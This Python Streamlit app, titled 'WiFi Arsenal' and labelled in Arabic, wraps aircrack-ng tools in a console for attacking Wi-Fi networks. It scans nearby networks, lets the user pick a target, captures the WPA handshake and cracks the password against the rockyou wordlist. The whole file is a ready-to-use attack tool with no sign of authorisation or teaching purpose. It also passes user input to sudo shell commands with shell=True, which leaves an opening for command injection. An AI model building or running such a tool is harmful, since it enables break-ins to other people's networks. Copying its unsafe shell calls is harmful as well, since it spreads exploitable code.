import streamlit as st
import subprocess
import time
import os
import re
import pandas as pd
from io import StringIO

st.set_page_config(page_title="WiFi Arsenal", layout="wide")
st.title("🔍 WiFi Recon & Cracking Console")

if "log" not in st.session_state:
    st.session_state.log = ""
if "scan_data" not in st.session_state:
    st.session_state.scan_data = None
if "target_bssid" not in st.session_state:
    st.session_state.target_bssid = None
if "target_channel" not in st.session_state:
    st.session_state.target_channel = None
if "capture_file" not in st.session_state:
    st.session_state.capture_file = None

def run_cmd(cmd, capture=True, timeout=30):
    try:
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        out, err = proc.communicate(timeout=timeout)
        if capture:
            return out + err
        return proc.returncode
    except subprocess.TimeoutExpired:
        proc.kill()
        return "[TIMEOUT] " + cmd

def append_log(text):
    st.session_state.log += text + "\n"

col1, col2 = st.columns([1, 2])

with col1:
    st.subheader("التحكم")
    iface = st.text_input("واجهة الشبكة", "wlan0")
    if st.button("بدء وضع المراقبة"):
        with st.spinner("تشغيل airmon-ng..."):
            res = run_cmd(f"sudo airmon-ng start {iface}")
            append_log(res)
            st.success("تم التفعيل")
    mon_iface = st.text_input("واجهة المراقبة", f"{iface}mon")
    if st.button("مسح الشبكات"):
        with st.spinner("جمع البنود..."):
            res = run_cmd(f"sudo timeout 30 airodump-ng {mon_iface}")
            append_log(res)
            lines = res.splitlines()
            nets = []
            for line in lines:
                if "BSSID" in line and "PWR" in line:
                    continue
                parts = re.split(r'\s{2,}', line.strip())
                if len(parts) >= 6 and re.match(r'([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}', parts[0]):
                    bssid = parts[0]
                    pwr = parts[2] if len(parts)>2 else "0"
                    ch = parts[3] if len(parts)>3 else "0"
                    enc = parts[4] if len(parts)>4 else ""
                    essid = parts[-1] if len(parts)>5 else ""
                    nets.append([bssid, pwr, ch, enc, essid])
            df = pd.DataFrame(nets, columns=["BSSID", "PWR", "CH", "ENC", "ESSID"])
            st.session_state.scan_data = df
            st.session_state.target_bssid = None
            st.session_state.target_channel = None
            st.session_state.capture_file = None
            st.success("اكتمل المسح")
    if st.session_state.scan_data is not None:
        st.subheader("الشبكات المكتشفة")
        df = st.session_state.scan_data
        st.dataframe(df, use_container_width=True)
        selected_index = st.selectbox("اختر هدفاً", df.index, format_func=lambda i: f"{df.loc[i, 'ESSID']} ({df.loc[i, 'BSSID']})")
        if st.button("تعيين الهدف"):
            st.session_state.target_bssid = df.loc[selected_index, "BSSID"]
            st.session_state.target_channel = df.loc[selected_index, "CH"]
            st.success(f"الهدف: {st.session_state.target_bssid} على القناة {st.session_state.target_channel}")
    if st.session_state.target_bssid:
        st.subheader("التقاط المصافحة")
        if st.button("بدء الالتقاط"):
            bssid = st.session_state.target_bssid
            ch = st.session_state.target_channel
            fname = f"capture_{bssid.replace(':','')}"
            cmd = f"sudo timeout 120 airodump-ng -c {ch} --bssid {bssid} -w {fname} {mon_iface}"
            with st.spinner("جاري الالتقاط (انتظر 120 ثانية)"):
                out = run_cmd(cmd)
                append_log(out)
            cap_file = f"{fname}-01.cap"
            if os.path.exists(cap_file):
                st.session_state.capture_file = cap_file
                st.success(f"تم الحفظ: {cap_file}")
            else:
                st.error("لم يتم التقاط حزمة")
        if st.session_state.capture_file:
            st.subheader("اختراق")
            wordlist = st.text_input("مسار قائمة الكلمات", "/usr/share/wordlists/rockyou.txt")
            if st.button("بدء الهجوم"):
                cap = st.session_state.capture_file
                cmd = f"sudo aircrack-ng -w {wordlist} {cap}"
                with st.spinner("محاولة الكسر..."):
                    res = run_cmd(cmd, timeout=180)
                    append_log(res)
                    if "KEY FOUND" in res:
                        st.success("✅ تم العثور على المفتاح!")
                    else:
                        st.warning("لم يُعثر")
        if st.button("إعادة ضبط"):
            run_cmd(f"sudo airmon-ng stop {mon_iface}")
            st.session_state.clear()
            st.experimental_rerun()

with col2:
    st.subheader("سجل العمليات")
    st.text_area("المخرجات", st.session_state.log, height=500)
    if st.button("مسح السجل"):
        st.session_state.log = ""